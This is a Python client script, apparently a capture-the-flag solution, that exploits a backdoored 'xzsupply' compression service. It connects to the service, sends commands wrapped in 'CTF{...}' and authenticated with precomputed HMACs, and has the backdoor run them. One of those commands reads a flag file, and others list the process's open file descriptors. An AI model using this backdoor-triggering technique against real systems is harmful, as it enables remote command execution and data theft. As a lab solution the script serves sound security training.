import socket
import struct
import sys
import lzma


# pre-calculated MAC
# HMAC(echo 'This is working') -> 9b4180ab1e27f3f52f5cbdf8bdec92436eaf467f1897b84e314fb2242fbb6c8b

CMD_FDS = "ls -al /proc/self/fd | tee /tmp/myfds"
CMD_FDS_5 = "ls -al /proc/self/fd | tee /tmp/myfds >&5"
CMD_FLAG_5 = "cat /home/ctf/flag.txt >&5"

_MACS = {
        "echo 'This is working'":
            "9b4180ab1e27f3f52f5cbdf8bdec92436eaf467f1897b84e314fb2242fbb6c8b",
        CMD_FDS:
            "2299c9e19bd15c5deee9f8f59ceb8f6deaf07bd43181bf710f9b921c96ff9928",
        CMD_FDS_5:
            "2c06f9d42913161fad1b83f3d80f57763700cce2b350ba8f13aa467efbd7c1c4",
        CMD_FLAG_5:
            "3adffc3b9bbad7af80d71c9ce8d28a2bdc347ffae61df929b7dbccfd86f5dcf5",
        }


def getarg(i, default=None, argv=sys.argv):
    try:
        return argv[i]
    except IndexError:
        return default


def encode_command(cmd):
    cmd_bytes = f"CTF{{{cmd}}}".encode("utf-8")
    mac_bytes = bytes.fromhex(_MACS[cmd])
    return cmd_bytes+mac_bytes


def recvuntil(s, which):
    if isinstance(which, str):
        which = which.encode("utf-8")
    buf = b""
    while not buf.endswith(which):
        buf += s.recv(1)
    return buf


def sendrecv(s, val):
    l = struct.pack(">h", len(val))
    s.send(l)
    s.send(val)
    resplen = s.recv(2)
    rl = struct.unpack(">h", resplen)[0]
    comp = s.recv(rl)
    dec = lzma.LZMADecompressor()
    try:
        return dec.decompress(comp)
    except lzma.LZMAError:
        return comp


def main(argv):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    h, p = getarg(1, default="127.0.0.1:6666", argv=argv).split(':', 1)
    host = socket.gethostbyname(h)
    p = int(p)
    s.connect((host, p))
    recvuntil(s, b"in the same way.\n")
    # test plain xz
    pt = "Hello World! This is a test of the xzsupply service.".encode("utf-8")
    rv = sendrecv(s, pt)
    print(repr(rv))
    cmd = encode_command(CMD_FLAG_5)
    print(repr(cmd))
    rv = sendrecv(s, cmd)
    print(repr(rv))


if __name__ == '__main__':
    main(sys.argv)
